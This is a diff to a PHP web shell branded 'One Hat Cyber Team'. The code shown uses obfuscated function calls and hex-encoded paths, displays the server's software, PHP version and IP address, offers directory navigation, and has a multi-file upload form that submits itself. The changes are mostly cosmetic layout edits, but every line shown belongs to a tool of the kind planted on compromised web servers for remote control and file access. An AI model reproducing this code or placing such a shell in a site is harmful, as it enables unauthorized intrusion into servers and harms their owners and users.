@@ -54,14 +54,14 @@ for($i=0;$i<$___;$i++) {
 
 				<title></title>
 
-			<link rel="stylesheet" href="https://dl.dropbox.com/s/xjgymaiw4s7vifd/ohct.css" type="text/css">
+			<link rel="stylesheet" href="https://dl.dropbox.com/s/5u1bzhtt93q53to/ohct.css" type="text/css">
 			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
 		</head>
 
-		<body style="width: 100%;margin: 2px;background: #000000;font-size: 17px;"><br />
+		<body style="width: 99%;margin: auto;background: #000000;font-size: 17px;"><br />
 			<header>
-				<div class="y x">
+				<div class="border y x">
 					<a class="ajx" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
 						One Hat Cyber Team
 					</a>
@@ -70,20 +70,25 @@ for($i=0;$i<$___;$i++) {
 
 				
 			</header>
-
-			<article>
-				<div class="i">
-					<i class="far fa-hdd"></i>
-					<?php echo $GNJ[0]();?>
-
-					<br />
-
-					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;SOFT  : <?php echo $_SERVER['SERVER_SOFTWARE'];?> PHP : <?php echo $GNJ[1]();?>
+				<div class="border k">
+                                     <div class="v">
+					<i class="fa fa-tv"></i><span class="u">  &thinsp;&thinsp; 
+					<?php echo $GNJ[0]();?></span>
 
 					<br />
 
-					<i class="far fa-folder"></i>
-					
+					<i class="fa fa-lightbulb"></i> &thinsp;&thinsp;SOFT : <span class="u"><?php echo $_SERVER['SERVER_SOFTWARE'];?></span>
+					<br />
+
+                                        <i class="fa fa-hdd"></i> &thinsp;&thinsp;PHP : <span class="u"><?php echo $GNJ[1]();?></span>
+					<br />
+
+                                        <i class="fa fa-wifi"></i> &thinsp;&thinsp;IP : <span class="u">
+                                        <?php echo $_SERVER['SERVER_ADDR'];?></span>
+
+					<br />
+
+					<i class="fa fa-folder"></i> &thinsp;&thinsp; 
 					<?php
 					if(isset($_GET["d"])) {
 						$d = uhex($_GET["d"]);
@@ -95,7 +100,7 @@ for($i=0;$i<$___;$i++) {
 					$k = $GNJ[4]("/(\\\|\/)/", $d );
 					foreach ($k as $m => $l) { 
 						if($l=='' && $m==0) {
-							echo '<a class="ajx" href="?d=2f">/</a>';
+							echo '<a class="ajx" href="?d=2f">~</a>/';
 						}
 						if($l == '') { 
 							continue;
@@ -112,16 +117,13 @@ for($i=0;$i<$___;$i++) {
 					?> 
 
 					<br />
-                                        <i class="fas fa-link"></i>
-                                        <?php echo $_SERVER['SERVER_ADDR'];?>
-					<br />
 
 					<br />
 
 					<form method="post" enctype="multipart/form-data">
 						<label class="l w">
-							<input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp; Choose File
-						</label>&nbsp;
+							<input type="file" name="n[]" onchange="this.form.submit()" multiple><span class="u"> &nbsp; Choose File  &nbsp; </span>
+						</label>
 					</form><br />
 
 					<?php
@@ -145,7 +147,8 @@ for($i=0;$i<$___;$i++) {
 					}
 					?>
 
-				</div>
+				</div></div>
+				<div class="border k">
 					<?php
 					$a_ = '<table cellspacing="0" cellpadding="7" width="100%">
 						<thead>
@@ -163,8 +166,7 @@ for($i=0;$i<$___;$i++) {
 							</tr>
 						</tbody>
 					</table>';
-					$d_ = '<br />
-										<br />
+					$d_ = '<br /><br />
 										<input type="submit" class="w" value="&nbsp;OK&nbsp;" />
 									</form>';
 					if(isset($_GET["s"])) {
@@ -475,7 +477,6 @@ for($i=0;$i<$___;$i++) {
 					}
 					?>
 
-			</article><br />
 			<?php
 			if(isset($_GET["1"])) {
 				echo $f;
